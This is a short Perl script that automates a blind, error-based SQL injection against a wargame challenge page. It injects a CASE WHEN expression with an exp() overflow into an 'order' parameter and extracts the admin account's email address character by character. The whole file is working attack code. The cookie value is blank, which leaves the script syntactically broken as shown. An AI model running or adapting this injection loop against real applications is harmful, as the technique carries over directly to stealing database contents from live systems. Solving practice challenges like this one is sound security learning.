#!/usr/bin/perl
use strict;
use warnings;
use HTTP::Tiny;

my @CHARSET = (
  33  ..  47,  # !"#$%&'()*+,-./
  48  ..  57,  # 0-9
  58  ..  64,  # :;<=>?@
  #65  ..  70,  # A-F
  #97  ..  102, # a-f
  #65  ..  90,  # A-Z
  91  ..  96,  # [\]^_`
  97  ..  122, # a-z
  123 ..  126, # {|}~
);

my $URL =
"https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
;

my $COOKIE =
;

my $found;
for my $POS (1 .. 30) {
  my $i = 0;

  for my $ORD (@CHARSET) {
    $i++;

    my $PAYLOAD =
    "?order=case%20when%20(id=%27admin%27%20%26%26%20".
    "ord(mid(email,$POS,1))=$ORD)%20then%20exp(1234567890)%20end"
    ;

    my $REQ = HTTP::Tiny->new->get($URL.$PAYLOAD, {
        headers => {
          "Cookie" => $COOKIE,
        },
    });

    # ---------------------------------------------
    if ($REQ->{content} =~ '<table border=1><tr><th>id</th><th>email</th><th>score</th></table><hr>query : ') {
      $found .= chr $ORD;
      print "$POS => $ORD, Total: '$found'\n";
      last;

    # ---------------------------------------------
    } else {
      if ($i == $#CHARSET) { # last char and not found
        $found .= chr 219;
      }
    }
    # ---------------------------------------------
  }
}

# vim:sw=2:ts=2:sts=2:et:cc=80
# End of file
